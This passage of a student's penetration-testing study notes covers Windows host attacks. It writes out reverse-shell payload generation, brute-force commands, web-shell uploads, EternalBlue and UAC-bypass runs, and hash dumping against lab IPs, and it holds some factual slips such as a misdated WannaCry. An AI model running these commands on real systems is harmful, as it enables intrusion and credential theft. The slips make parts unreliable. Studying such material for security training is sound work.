```toc
```

# Host & Network Penetration Testing: System/Host Based Attacks #

## Introduction ##

**Topic Overview**:
+ Introduction To System/Host Based Attacks
+ Overview of Windows Vulnerabilities 
+ Exploiting Windows Vulnerabilities 
+ Windows Privilege Escalation 
+ Windows File System Vulnerabilities 
+ Windows Credential Dumping 
+ Windows Lateral Movement 
+ Overview of Linux Vulnerabilities 
+ Exploiting Linux Vulnerabilities 
+ Linux Privilege Escalation 
+ Linux File System Vulnerabilities 
+ Linux Credential Dumping 

**Learning Objectives**:
+ understand various vulnerabilities affecting both Windows & Linux
+ Will be able to identify exploit vulnerabilities on Windows & Linux systems
+ Get an understanding of how to perform privilege escalation on both Windows & Linux systems
+ Identify and exploit file system vulnerabilities on Windows & Linux 
+ Understand how credentials are stored on both Windows & Linux systems and how password hashes can be dumped 

## Introduction to System/Host based Attacks ##

**What Are System/Host Based Attacks:**
+ System/Host based attacks are attacks that are targeted toward a specific system or host running a specific OS (Windows, Linux, etc)
+ Network services are not the only attack vector that can be targeted during a penetration test
+ System/Host based attacks usually come in to play <mark style="background: #FFF3A3A6;">after you have gained access to a target network</mark>, where you are now required to exploit servers, workstations, laptops on the internal network 

**System/Host Based Attacks:**
+ Focuses on inherent vulnerabilities on the OS
+ Much more specialized 
+ Exploit misconfigurations on inherent vulnerabilities 
+ Will focus on Windows and Linux 
+ Will also need to do privilege escalation, move throughs the network, etc

# Windows #

## Windows Vulnerabilities ##

### Overview of Windows Vulnerabilities ###

**History of Windows Vulnerabilities:**
+ Microsoft Windows is the dominant OS worldwide with a market share of >=70% as of 2021
+ So popular that it gives attackers a bigger threat surface
+ Over the last 15 years, windows has had a lot of vulnerabilities, such as Eternal Blue of Conflicker 
+ So popular that the exploits can be gotten with publicly available sources 

**Windows Vulnerabilities:** 
+ There are various windows OS, so it is a fragmented attack surface 
+ All windows OS share a likeness given the development model and **philosophy** 
	+ Windows OS have been developed in the C programming language, making them vulnerable to buffer overflow, arbitrary code execution, etc
	+ By default, Windows is not configured to run securely and require a proactive implementation of security patches
	+ Newly discovered vulnerabilities are not immediately patched by Microsoft, since there are so many OS's, many systems are left unpatched 

+ The frequent releases of new versions of Windows is also contributing factor to exploitation, takes a awhile to make upgrades, older versions will have an increasing number of vulnerabilities 
+ Windows is also vulnerable to cross platform vulnerability, for example SQL injection attacks
+ Also vulnerable to physical attacks: theft, malicious peripheral devices, etc

**Types of Windows Vulnerabilities**: 
+ <mark style="background: #ADCCFFA6;">Information Disclosure</mark> 
	+ allows an attacker to access confidential data 
+ <mark style="background: #ADCCFFA6;">Buffer overflow</mark>
	+ Programming error, allows attacker to write data to a buffer and overrun the allocated buffer, writing data to allocated memory addresses for other applications
+ <mark style="background: #ADCCFFA6;">Remote Code Execution</mark>
	+ Can run code on the target system remotely 
+ <mark style="background: #ADCCFFA6;">Privilege escalation</mark> 
	+ Allows an attacker to elevate their privileges after initial compromise 
+ <mark style="background: #ADCCFFA6;">Denial of Services (DOS)</mark>
	+ Allows attacker to consume system/host resources (CPU, RAN, Network, etc), preventing it from functioning normally 

### Frequently Exploited Windows Services ###

+ Microsoft Windows has various native services and protocols can be configures to run on a host
+ These services provide an attacker a attack vector 
+ Should understand these services, how they work, and potential vulnerabilities is very important

Table of frequently Exploited Windows Services 
![](FreqExploitedWindowsServices.png)
+ <mark style="background: #BBFABBA6;">ISS</mark> is a web server software 
	+ can host applications, lots of potential
+ <mark style="background: #BBFABBA6;">WebDAV</mark> is an HTTP extension 
	+ Used to enable <mark style="background: #FFF3A3A6;">file server</mark> functionality to a web server like ISS
+ <mark style="background: #BBFABBA6;">SMB/CIFS</mark> Network File Share
  + Can run on top of NetBios
  + <mark style="background: #FFF3A3A6;">Share files and peripherals</mark>
  + Example: can connect windows systems to share files, folders, printers, etc
+ <mark style="background: #BBFABBA6;">RDP</mark>
  + Can **remotely access** a windows system, disabled by default, usually need credentials but after will have a <mark style="background: #FFF3A3A6;">GUI and can control the system</mark>
+ <mark style="background: #BBFABBA6;">WinRM</mark> Remote Management Protocol
  + Less familiar, allows <mark style="background: #FFF3A3A6;">commands to be executed on a windows system remotely</mark>, regardless of what network you are on 

## Exploiting Windows Vulnerabilities ##

### Exploiting Microsoft ISS WebDAV ###

#### Microsoft IIS ####
+ IIS (`Internet Information Services`) to a proprietary web server software developed my Microsoft for windows
+ Can be used to host websites/web apps, and provides administrators with a robust GUI
+ IIS can be used to host both static and dynamic web pages developed in `ASP.NET` and `PHP`
+ Typically configured to run on port 80/443
+ Supports executable file extensions:
	+ .asp
	+ .aspx
	+ .config
	+ .php

#### WebDAV ####
+ WebDAV (`Web-based Distributed Authoring and Versioning`) is a set of extension to the HTTP protocol
	+ Allows users to collaboratively edit and manage files on remote servers
+ Enables web server to function as a file server 
+ WebDAV runs on top of Microsoft ISS on port 80/443
+ In order to connect to a WebDAV server, will need legitimate credentials
	+ authenticate in the form of username and password

#### WebDAV Exploitation ####
+ First step is to <mark style="background: #FFF3A3A6;">identify whether WebDAV has been configured to run on the IIS</mark> web server
+ Can perform a <mark style="background: #FFB86CA6;">brute-force attack on the WebDAV</mark> server in order to get legitimate credentials that can be used for authentication 
+ After obtaining legitimate credentials, can authenticate with WebDAV server and upload a <mark style="background: #FFF3A3A6;">malicious .asp payload</mark> that can be used to execute arbitrary commands or obtain a reverse shell

#### Exploitation Tools ####
+ <mark style="background: #D2B3FFA6;">davtest</mark> - Used to <mark style="background: #ADCCFFA6;">scan, authenticate and exploit</mark> a WebDAV server
	+ pre-installed on Kali, and Parrot OS
+ Can <mark style="background: #ADCCFFA6;">test the DAV connection</mark> with the following `-url`:
	+ `davtest -url http://10.3.18.171/webdav/`
	+ Will say if it is open or not and say if it was able to get in 
+ Can <mark style="background: #ADCCFFA6;">specify credentials</mark> with the following `-auth`:
	+ `davtest -auth bob:password_123321 -url http://10.3.18.171/webdav/`
	+ Will test if it can create a directory with a random string
	+ Will attempt to upload various types of files
	+ Check for text file execution, can potentially execute a payload if something is available like `asp`
+ <mark style="background: #D2B3FFA6;">cadaver</mark> - supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV server
	+ Pre-installed on Kali and Parrot IS
	+ Can <mark style="background: #ADCCFFA6;">connect</mark> using the following `cadaver command`:
		+ `cadaver http://10.3.18.17/webdav/`
		+ will need to give username and password
		+ Will be given a sudo shell to interact with the WebDAVServer
  + Can get a <mark style="background: #ADCCFFA6;">WebShell in Kali linux</mark> with the following command:
	+ `ls -al /usr/share/webshells/`
		+ can see which one is best with this, for example an `asp` web-shell 
+ On `cadaver` can <mark style="background: #ADCCFFA6;">upload the web-shell</mark> with the following:
	+ `put /usr/share/webshells/asp/webshell.asp` 
		+ uploads the file, can even see it was uploaded from the browser
		+ Can also `execute` it from the browser, will now be able to execute commands on the target system 
+ On Windows remember that `ls` is `dir`
	+ can list the C drive with: `dir C:\`
+ Also remember on Windows that `cat` is `type`

<mark style="background: #FFB86CA6;">--script=http-enum</mark>
+ nmap scan to <mark style="background: #ADCCFFA6;">get information about the Http servers</mark>, including if WebDAV is running 
+ Example: `nmap -sV -p 80 10.3.18.171 --script=http-enum`
  + will often have the WebDAV directory as `/webdav/`
  + will also often say if you get a 401 unauthorized, meaning WebDAV needs credentials 

<mark style="background: #D2B3FFA6;">hydra</mark> can be used to <mark style="background: #ADCCFFA6;">brute force the credentials</mark> 
+ Example: `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.18.171 http-get /webdav/`
  + Where both the username and password is brute-force
  + `-L` to specify user list
  + `-P` to specify password list
  + the directory `/webdav/` will be gotten with a http-get and provided credentials 

### Exploiting WebDAV With Metasploit ###

#### Manual Way ####
<mark style="background: #D2B3FFA6;">msfvenom</mark>
+ Can be used to <mark style="background: #ADCCFFA6;">generate a payload</mark> to get a meterpreter session, which is an advance reverse shell (upload/download files)
+ Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=USERIP LPORT=1234 -f asp > shell.asp`
	+ payload is specified with `-p`
	+ `LHOST` is our computer 
	+ `LHOST` is the port we will listen with 
	+ `-f` is to specify file type
	+ `>` sends it to the file with the specified name

Can now use <mark style="background: #D2B3FFA6;">cadaver</mark> to <mark style="background: #ADCCFFA6;">send the payload</mark>
+ To get webdav sudo shell:
	+ Example: `cadaver http://10.3.22.26/webdav`
	+ Will also need to put username and password
+ Now can upload the payload: 
	+ Example: `put /root/shell.asp`

Now need to set up a <mark style="background: #BBFABBA6;">listener</mark> or <mark style="background: #BBFABBA6;">handler</mark> to listen for out payload reaching out to us when we run it
+ Will first set up the postgresql service because metasploit needs it 
	+ `service postgresql start && msfconsole`
+ Then will set up the handler:
	+ `use multi/handler`
	+ `set payload windows/meterpreter/reverse_tcp`
	+ `set LHOST 10.1.0.9` (our IP)
	+ `set LPORT 1234` (based on what we put in the payload)

Once your in
+ Can confirm it started with `sysinfo`
+ Can check privileges with `getuid`

#### Automated Way ####
Can use <mark style="background: #FF5582A6;">msfconsole</mark> to automate this process 
+ will `search iis upload`
	+ and `use exploit/windows/iis/iis_webdav_upload_asp`
	+ Will give us a meterpreter session automatically, with the following options set
		+ `set HttpUsername bob`
		+ `set HttpPassword password_123321`
		+ `set RHOSTS 10.3.22.26` (target IP)
		+ `set PATH /webdav/metasploit.asp` (webdav directory is where it is hosted and the name is set for the asp file)
		+ Can now run/exploit 
+ Will <mark style="background: #ADCCFFA6;">automatically delete the payload, and will be given a meterpreter session</mark>
+ can also delete with <mark style="background: #D2B3FFA6;">cadaver</mark>

### Exploiting SMB With PsExec ###

#### SMB ####
+ <mark style="background: #BBFABBA6;">SMB</mark> (`Server Message Block`) is a network file sharing protocol used to share files and peripherals (printers and serial ports) between computers on a LAN
+ SMB used TCP port 445, originally SMB ran on top of NetBIOS using port 139
+ <mark style="background: #BBFABBA6;">SAMBA</mark> is the open source Linux implementation of SMB, allows Windows systems to access Linux shares and drives

#### SMB Authentication ####
+ SMB protocol utilizes two levels of authentication 
	+ **User** Authentication 
	+ **Share** Authentication 
+ <mark style="background: #FFF3A3A6;">User authentication</mark> - Users must provide a username and password in order to authenticate with the SMB server in order to access a share 
+ <mark style="background: #FFF3A3A6;">Share authentication</mark> - Users must provide a password in order to access restricted share 

<mark style="background: #FF5582A6;">Note</mark>:  Both of the authentication levels utilize a challenge response authentication system

![](SMBAuth.png)

#### PsExec ####
+ <mark style="background: #D2B3FFA6;">PsExec</mark> is a lightweight <mark style="background: #ADCCFFA6;">telnet-replacement</mark> developed by Microsoft that allows you to <mark style="background: #ADCCFFA6;">execute processes on remote Windows system</mark> using any user's credentials 
+ PsExec authentication is performed <mark style="background: #FFF3A3A6;">via SMB</mark>
+ Can use <mark style="background: #D2B3FFA6;">PsExec</mark> utility to <mark style="background: #ADCCFFA6;">authenticate with the target system legitimately and run arbitrary commands</mark> or launch a remote command prompt 
+ Very similar to RDP, but controlled <mark style="background: #FFF3A3A6;">via CLI</mark>

#### SMB Exploitation With PsExec ####
+ In order to utilize <mark style="background: #D2B3FFA6;">PsExec</mark> to gain access to a Windows target, will need to identify legitimate user accounts and their respective passwords or password hashes 
+ Can be done by leveraging various tools and techniques, though most common will involve an <mark style="background: #ADCCFFA6;">SMB login brute-force attack</mark> 
+ Can narrow down our brute-force attack to only include <mark style="background: #FFF3A3A6;">common windows user accounts</mark> like:
	+ `Administrator` 
+ After we have obtained a legitimate user account and password, we use the credentials to authenticate via <mark style="background: #D2B3FFA6;">PsExec</mark> and <mark style="background: #ADCCFFA6;">execute arbitrary system commands or obtain a reverse shell</mark>

Can use <mark style="background: #FF5582A6;">msfconsole</mark> to automate the attack
+ will want to launch with `service postgresql start && msfconsole`
	+ because msfconsole uses a database that runs with postgresql 

Then will search <mark style="background: #FF5582A6;">smb_login</mark>
+ or `use auxiliary/scanner/smb/smb_login`
  + `set RHOSTS 10.3.19.6`
  + `set USER_FILE set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt` (Because we are brute forcing)
  + `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` (Because we are brute forcing)
  + `set VERBOSE false` (to only show successful logins)

<mark style="background: #D2B3FFA6;">psexec</mark> is a <mark style="background: #FFF3A3A6;">windows utility so can not use it on a linux system</mark>
+ will need to use <mark style="background: #D2B3FFA6;">psexec.py</mark> instead so a python script can do it 
+ Can run with `psexec.py Administrator@10.3.19.6 cmd.exe`
	+ where are using the username: `Administrator`
	+ The IP is the target 
	+ and `cmd.exe` is executed because the goal is CLI access 
	+ will ask you for the `password`
+ It will then have CLI access 
	+ can use `whoami` to see privilege level 

To get a <mark style="background: #FF5582A6;">meterpreter</mark> session, can use `msfconsole`
+ can `search psexec` or `use exploit/windows/smb/psexec`
	+ <mark style="background: #FF5582A6;">NOTE</mark>: THIS IS RUNNING A MALICIOUS FILE ON THE TARGET SYSTEM UNLIKE THE PREVIOUS EXPLOIT, BE CAREFUL OF ANTI VIRUS
	+ `set RHOSTS 10.3.19.6`
	+ `set SMBUser Administrator` (where the username was got with brute-force)
	+ `set SMBPass qwertyuiop` (where the password was got with brute-force)

### Exploiting Windows MS17-010 SMB Vulnerability (Eternal Blue) ###

#### EternalBlue ####
+ <mark style="background: #FF5582A6;">EternalBlue</mark> (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerability and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is apart of
+ <mark style="background: #FF5582A6;">EternalBlue</mark> exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability
	+ it was leaked to the public by a hacker group called the **Shadow Brokers** in 2017
+ <mark style="background: #FF5582A6;">EternalBlue</mark> takes advantage of a vulnerability in the <mark style="background: #ADCCFFA6;">Windows SMBv1 protocol</mark> that allows attackers to send specially crafted packets that allow arbitrary commands 
	+ can get a **reverse shell** or **meterpreter**
	+ Will also <mark style="background: #FFF3A3A6;">provide elevated access</mark>, no need for privilege escalation

+ <mark style="background: #FF5582A6;">EternalBlue</mark> exploit was used in the <mark style="background: #FF5582A6;">WannaCry</mark> ransomware attack in June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible 
	+ Eternal blue would scan other computers on the network and spread the <mark style="background: #FF5582A6;">WannaCry</mark> 
+ The vulnerability affects <mark style="background: #FFF3A3A6;">multiple versions of Windows</mark>:
	+ Windows Vista
	+ Windows 7
	+ Windows server 2008
	+ Windows 8.1
	+ Windows server 2021
	+ Windows 10
	+ Windows server 2016

+ Microsoft released a patch for the vulnerability in March 2017, however, many users and companies have yet to patch the system
+ The <mark style="background: #FF5582A6;">EternalBlue</mark> exploit has a <mark style="background: #FF5582A6;">MSF</mark> auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems
+ The <mark style="background: #FF5582A6;">EternalBlue</mark> exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system
+ In addition to the <mark style="background: #FF5582A6;">MSF</mark> modules, we can also manually exploit the vulnerability by utilizing <mark style="background: #FFF3A3A6;">publicly available exploit code</mark>

AutoBlue-MS17-010 is the <mark style="background: #ADCCFFA6;">exploit script</mark> on Github

#### Recon EternalBlue ####
+ will first do some recon
	+ `sudo nmap -sV -p 445 -O IP`
		+ Can see that SMB is running and it is windows server 2008, which is vulnerable 
+ Can also use an nmap script, <mark style="background: #FFB86CA6;">--script smb-vuln-ms17010</mark> to see if it is vulnerable 
	+ Will tell us the <mark style="background: #ADCCFFA6;">risk and that it is running SMBv1</mark>

#### Manually Exploiting EternalBlue ####

Will go to the Github <mark style="background: #D2B3FFA6;">AutoBlue-MS17-010</mark>
+ Clone the repository 
+ The exploit .py file will have multiple versions
+ There will also be a text file with dependencies 
	+ can install with `pip install -r requirements.txt`
+ first generate the shell code with:
	+ ./shell_prep.sh
	+ can generate reverse shell with <mark style="background: #D2B3FFA6;">msfvenom</mark> 
		+ will have information requirements (LHOST, LPORT, etc)
+ Can now start a <mark style="background: #D2B3FFA6;">netcat</mark> listener 
	+  `nc -nvlp 1234` where 1234 was the port specified in the shell code
+ Then can <mark style="background: #FFF3A3A6;">run the exploit</mark>
	+ make a file executable with `chmod +x FILENAME.py`
	+ Then can run with `python3 eternalblue_exploit.py TARGET_IP shellcode/sc_x64.bin` (or whatever shell code is being used)
+ Now <mark style="background: #ADCCFFA6;">have a command shell </mark>

#### Automatic Exploiting EternalBlue ####
+ Open <mark style="background: #FF5582A6;">msfconsole</mark>
	+ `search eternalblue`
		+ will have an option of a scanner or an exploit 
	+ `show options`
	+ `set RHOSTS IP`
	+ `run`
+ Now has the <mark style="background: #FF5582A6;">meterpreter</mark> session very quickly 

### Exploiting RDP ###

+ The Remote Desktop Protocol (<mark style="background: #BBFABBA6;">RDP</mark>) is a <mark style="background: #FFF3A3A6;">proprietary GUI remote access protocol </mark>developed by Microsoft and is used to remotely connect and interact with a Windows system.
+ RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.
	+ Must be aware that they may move it to another port 
+ RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
+ We can perform an <mark style="background: #ADCCFFA6;">RDP brute-force attack</mark> to identify legitimate user credentials that we can use to gain remote access to the target system.

<mark style="background: #FF5582A6;">msfconsole</mark> has a good RDP scanner to verify if a port is running RDP
+ can `search rdp_scanner` or `use auxiliary/scanner/rdp/rdp_scanner`
	+ `set RHOSTS IP`
	+ `set RPORT PORT_NUMBER`
+ Will say if it is running and some version information 

Then, <mark style="background: #D2B3FFA6;">hydra</mark> can be used to do a brute force
+ `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.3.25.177 -s 3333`
	+ notice that the port is specified with `-s` because it is not on its tradition 3389
	+ can also use the `-t` to limit the speed 

Once the credentials are discovered, can now use <mark style="background: #D2B3FFA6;">xfreerdp</mark> to connect 
+ in the CLI, `xfreerdp /u:administrator /p:qwertyuiop /v:10.3.25.177:3333`

### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep) ###

Have previously used a brute-force attack, will now learn an <mark style="background: #FF5582A6;">inherent vulnerability</mark> 

#### BlueKeep ####
+ <mark style="background: #FF5582A6;">BlueKeep</mark> is the name given to an <mark style="background: #ADCCFFA6;">RDP vulnerability</mark> in Windows that could potentially allow attackers to <mark style="background: #FFF3A3A6;">remotely execute arbitrary code</mark> and gain access to a Windows system and consequently the network 
+ Made public by Microsoft in May 2019
+ BlueKeep takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to <mark style="background: #FFF3A3A6;">gain access to a chunk of kernel memory</mark>, allowing them to remotely execute arbitrary code at the system level without authentication 
	+ Kernel is privileged, but can <mark style="background: #FFF3A3A6;">easily cause crashes</mark> 
+ A patch was released on May 14th, 2019
+ At the time of discovery, about 1 million systems worldwide were found to be vulnerable 
+ The BlueKeep vulnerability affects multiple versions of Windows:
	+ XP
	+ Vista
	+ Windows 7
	+ Windows Server 2008 & R2

#### BlueKeep Exploit ####
+ The <mark style="background: #FF5582A6;">BlueKeep</mark> vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature
	+ Should only <mark style="background: #FFF3A3A6;">utilize verified exploit code</mark> and modules for exploitation
+ BlueKeep has an <mark style="background: #FF5582A6;">MSF</mark> auxiliary module that can check if a target system is vulnerable, also has an exploit module
+ BlueKeep exploit module can be used to exploit vulnerable Windows systems and get a privileged meterpreter session

<mark style="background: #FF5582A6;">Note</mark>: Targeting Kernel space memory and application <mark style="background: #ADCCFFA6;">can cause system crashes</mark>

Will use <mark style="background: #FF5582A6;">msfconsole</mark> for scanning and exploitation 
+ can `search BlueKeep` 
	+ will see the scanner and the exploit 
+ Scanner really only needs `RHOSTS`
+ Same for Exploit, but will need to specify the target type 
	+ `show target`
	+ select the type 

### Exploiting WinRM ###

+ `Windows Remote Management` (<mark style="background: #BBFABBA6;">WinRM</mark>) is a <mark style="background: #ADCCFFA6;">Windows remote management protocol</mark> that can be used to facilitate remote access with Windows systems over HTTP(S)
+ Microsoft implemented WinRM in to Windows in order to make life easier for system admins
+ WinRM is typically used in the following ways:
	+ Remotely access and interact with Windows hosts on a local network 
	+ Remotely access and execute commands on Windows systems
	+ Manage and configure Windows systems remotely 
+ WinRM typically uses TCP port 5985 and 5986 (HTTPS)
+ WinRM implements access control and security for communication between systems through various forms of authentication 
+ We can utilize a utility called "<mark style="background: #D2B3FFA6;">crackmapexec</mark>" to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system 
+ Can also utilize a ruby script called "evil-<mark style="background: #D2B3FFA6;">winrm</mark>" to obtain a command shell session on the target system

When doing recon on a system with <mark style="background: #FFB86CA6;">nmap</mark>:
+ Port **5985** and **5986** are not <mark style="background: #ADCCFFA6;">apart of the default ports scan </mark>
	+ Will have to use `-p-` or `-p 5985,5986`
+ Also the banner displayed under version is usually wrong, as <mark style="background: #FFF3A3A6;">WinRM does not provide a banner</mark>

Now that the system was found to be vulnerable, can use <mark style="background: #D2B3FFA6;">crackmapexec</mark> from the CLI to brute-force 
+ to attack <mark style="background: #BBFABBA6;">winrm</mark>: `crackmapexec winrm TARGET_IP -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

Can now use <mark style="background: #D2B3FFA6;">crackmapexec</mark> to execute a command following the `-x`
+ Example: `crackmapexec winrm 10.3.17.184 -u administrator -p tinkerbell -x "whoami`
	+ A good command for this is `systeminfo`

To get a shell, will use <mark style="background: #D2B3FFA6;">evil-winrm</mark>
+ Example: `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.3.17.184`

Can get a <mark style="background: #FF5582A6;">meterpreter</mark> session with <mark style="background: #FF5582A6;">msfconsole</mark>
+ Will `search winrm_script_exec` and use the exploit
	+ need to specify `RHOSTS`
	+ can also `set FORCE_VBS true`
	+ `set USERNAME user`
	+ `set PASSWORD password`

## Windows Privilege Escalation ##

### Windows Kernel Exploitation ###

#### Privilege Escalation ####
+ The process of exploiting vulnerabilities or misconfiguration in systems to <mark style="background: #FFF3A3A6;">elevate privileges</mark> from one user to another
	+ typically to a user with administrative or root access on a system
+ Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of penetration test
+ After gaining an initial foothold on a target system, will need to elevate privileges
+ Developing privilege escalation skills will mark you out as a good penetration tester  

#### Windows Kernel ####
+ A Kernel is a computer program that is the **core** of an OS and has complete control over every resource and hardware on a system 
	+ Acts as a <mark style="background: #FFF3A3A6;">translation between hardware and software</mark>, facilitates the communication between these two layers 
+ Windows NT is the kernel that comes pre-packages with all versions of Microsoft Windows and operates as a tradition kernel with a few exceptions based on user design 
	+ It consists of two main modes of operation that determine access to system resources and hardware
		+ <mark style="background: #ADCCFFA6;">User Mode</mark> - Programs and services running in user mode have limited access to system resources and functionality 
		+ <mark style="background: #ADCCFFA6;">Kernel Mode</mark> - Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory

#### Windows Kernel Exploitation ####
+ Kernel exploits on Windows will typically <mark style="background: #FFF3A3A6;">target vulnerabilities in the Windows kernel</mark> to execute arbitrary code in order to run privileged system commands or to obtain a system shell
+ This process differs based on the version of Windows being targeted and the kernel exploit being used
+ Privilege escalation on Windows systems will typically follow the following methodology:
	+ **Identify** kernel vulnerabilities 
	+ Downloading, compiling and transferring **kernel exploits** onto the target system 

#### Tools & Environment ####
+ <mark style="background: #D2B3FFA6;">Windows-Exploit-Suggester</mark> - This <mark style="background: #ADCCFFA6;">tool compares a target patch level against the Microsoft vulnerability database</mark> in order to detect potential missing patches on the target 
	+ Also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins 
	+ Github: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ <mark style="background: #BBFABBA6;">Windows-Kernel-Exploit</mark> - <mark style="background: #ADCCFFA6;">Collection of Windows Kernel</mark> exploits by CVE
	+ Github: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

With a <mark style="background: #FF5582A6;">meterpreter</mark> shell, can use in house `getsystem` command to try and elevate privileges
+ can also use `local_exploit_suggester`
	+ just specify the session, and hit run 
	+ Will show all exploit modules that can be used to exploit privileges 
	+ Will need to research to make sure the exploit will apply and is safe 
	+ Can check if it works with `getuid`

<mark style="background: #D2B3FFA6;">Windows-Exploit-Suggester</mark> requires that you create a text file with the output of `systeminfo` command in a txt file
+ Will navigate to the Github clone, and run `./windows-exploit-suggester.py --update` to get the most recent Microsoft database 
+ Then to run it: `./windows-exploit-suggester.py --database MOST_RECENT_DB.xls --systeminfo SYSTEMINFOFILE.txt`
+ Will then <mark style="background: #FFF3A3A6;">enumerate possible exploits</mark>, where the ones at the top are the most likely to work 
	+ Can the look up the MS number and go to the Github **SecWiki**

<mark style="background: #BBFABBA6;">Windows-Kernel-Exploit</mark> Github will contain the exploits as well as the c code that can be compiled and run 
+ can transfer the .exe to the system and run it 
+ Will wanna use the Temp directory as it is not frequently accessed 
	+ <mark style="background: #FF5582A6;">Note</mark>: Anti-virus might catch it! 
+ Can run `whoami` and see if it worked

### Bypassing UAC with UACMe ###

#### UAC ####
![](3%20Host%20&%20Network%20Penetration%20Testing/Images/UAC.png)
+ User Account Control (<mark style="background: #BBFABBA6;">UAC</mark>) is a Windows security feature introduced in Windows Vista that is used to <mark style="background: #ADCCFFA6;">prevent unauthorized changes from being made to the OS</mark>
+ <mark style="background: #BBFABBA6;">UAC</mark> is used to ensure that changes to the OS <mark style="background: #FFF3A3A6;">require approval from the admin or a user</mark> account that is part of the local admin group
+ A non-privileged user attempting to execute a program with elevate privileges will be prompted with the <mark style="background: #BBFABBA6;">UAC</mark> credential prompt, whereas a privileged user will be prompted with a consent prompt 
+ Attacks can <mark style="background: #ADCCFFA6;">bypass UAC</mark> in order to execute malicious executable with elevated privileges 

#### Bypassing UAC ####
+ In order to successfully bypass <mark style="background: #BBFABBA6;">UAC</mark>, will <mark style="background: #FFF3A3A6;">need to have access to a user account</mark> that is part of the local admins group on the Windows target system 
+ <mark style="background: #BBFABBA6;">UAC</mark> <mark style="background: #FFB86CA6;">allows a program to be executed with admin privileges</mark>, consequently prompting the user for confirmation 
![](UACSettings.png)
+ <mark style="background: #BBFABBA6;">UAC</mark> has <mark style="background: #ADCCFFA6;">various integrity levels ranging from low to high</mark>, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation 
+ There are multiple tools and techniques that can be used to bypass UAC, however, the tools and technique used will depend on the version of Windows running on the target system 

#### Bypassing UAC With UACMe ####
+ <mark style="background: #D2B3FFA6;">UACMe</mark> is an open source, robust privilege escalation tool developed by @hfire0x, it can be used to bypass Windows UAC by leveraging various techniques 
	+ Github: https://github.com/hfiref0x/UACME
+ The <mark style="background: #D2B3FFA6;">UACME</mark> Github repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to 10
+ It allows attackers to execute malicious payloads on a Windows target with admin/elevated privileged by abusing the inbuilt Windows AutoElevate tool
+ The UACMe Github repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target 

**Once a foothold is gotten with a shell**, can check privileges 
+ in meterpreter, can do `getprivs` if not very many, escalation will be needed 
+ Can start a shell with the `shell` command
	+ can do `net user` and net `localgroup administrators` to get more info about the user
+ So even if the user is apart of the admin group, can not run admin commands without <mark style="background: #BBFABBA6;">UAC</mark> bypasses
  + Example: Changing the password with `net user admin password123` will get denied

Will first **generate a payload** with <mark style="background: #D2B3FFA6;">msfvenom</mark>
+ Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=1234 -f exe > backdoor.exe`

Then will **set up** a <mark style="background: #BBFABBA6;">listener</mark> in <mark style="background: #FF5582A6;">msfconsole</mark>
+ Example: `use multi/handler`
+ then set the payload: `set payload windows/meterpreter/reverse_tcp`
+ set LHOST and LPORT

Will go back to the <mark style="background: #FF5582A6;">meterpreter</mark> session on the target
+ Will `mkdir Temp` as it is a good place to put exe's
+ Will `upload backdoor.exe`
+ And upload the <mark style="background: #FF5582A6;">UACMe payload</mark>, Example: `upload /root/Desktop/tools/UACME/Akagi64.exe`
+ To run, will `.\Akagi64.exe 23 c:\Temp\backdoor.exe`, and can check listener that it works
	+ where 23 represents the key or method
+ The listener will now start and can run `getprivs` to see if it worked
+ can see what other process are running with `ps` and even migrate to them with `migrate PROCESS_NUMBER`
	+ After that can do something like get the hashes with `hashdump`

### Access Token Impersonation ###

#### Windows Access Tokens ####
+ Windows access tokes are a core element of the authentication process on Windows and are created and managed by the **Local Security Subsystem Service** (<mark style="background: #BBFABBA6;">LSASS</mark>)
+ Windows <mark style="background: #ADCCFFA6;">access token is responsible for identifying and describing the security context </mark>of a process or thread running on a system. Simply put, an access toke <mark style="background: #FFF3A3A6;">can be thought of as a temporary key akin to a web cookie</mark> that provides users with access to a system or network resources without having to provide credentials each time a process is started or a system resources is accessed.
+ Access tokens are **generated** by the <mark style="background: #BBFABBA6;">winlogon.exe</mark> process every-time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the <mark style="background: #BBFABBA6;">userinit.exe</mark> process, after which all <mark style="background: #FFF3A3A6;">child processes started by a user will inherit a copy of the access token</mark> from their creator and will <mark style="background: #ADCCFFA6;">run under the privileges of the same access token</mark> 
+ Windows access tokens are categorized based on the varying security levels assigned to them 
	+ These security levels are used to <mark style="background: #ADCCFFA6;">determine the privileges</mark> that are assigned to a specific token 
+ An access token will typically be assigned one of the following <mark style="background: #FF5582A6;">security levels</mark>:
